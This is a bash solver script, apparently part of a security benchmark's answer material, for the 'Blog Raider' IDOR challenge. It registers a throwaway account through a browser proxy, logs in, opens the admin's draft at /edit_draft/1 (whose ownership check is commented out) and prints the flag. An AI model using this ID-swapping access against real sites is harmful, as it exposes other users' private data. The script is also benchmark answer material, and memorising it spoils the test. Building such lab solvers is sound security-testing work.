#!/usr/bin/env bash
# XBEN-090-24 — "Blog Raider" IDOR. Proxy-mode twin. /edit_draft/<id> loads the
# named draft with the ownership check commented out; draft 1 is the admin's and
# its content is the flag. The forms are Flask-WTF (CSRF tokens), so the page is
# driven in a real browser — register, log in, then open the draft — which keeps
# each token where the browser put it.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
DRAFT="${2:-1}"
NAME="raider$$"
SESSION="xben090p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/register"
ab wait '#username' >/dev/null 2>&1 || true
ab fill '#username' "$NAME" >/dev/null
ab fill '#password' 'Passw0rd!' >/dev/null
ab fill '#confirm_password' 'Passw0rd!' >/dev/null
ab click '#submit' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
# now on the login page
ab wait '#username' >/dev/null 2>&1 || true
ab fill '#username' "$NAME" >/dev/null
ab fill '#password' 'Passw0rd!' >/dev/null
ab click '#submit' >/dev/null
ab wait --load networkidle >/dev/null 2>&1 || true
go "$URL/edit_draft/$DRAFT"
print_flag
